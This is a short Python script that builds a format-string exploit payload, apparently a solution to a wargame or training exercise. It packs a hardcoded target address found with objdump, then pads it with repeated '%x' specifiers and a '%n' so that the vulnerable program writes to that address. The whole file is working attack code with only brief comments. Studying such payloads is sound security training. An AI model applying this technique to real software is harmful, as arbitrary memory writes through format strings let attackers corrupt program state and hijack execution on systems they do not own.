import struct

def pad(string, length):
	assert(length >= len(string))
	return (string + "." * (length - len(string)))

# address of the target variable
# can be found using objdump
addr = struct.pack("I", 0x08049638)

# padding is such that %n lands on the address above as its parameters 
padding = pad(".." + "%x " * 131 + "%n", 512)

print(addr + padding)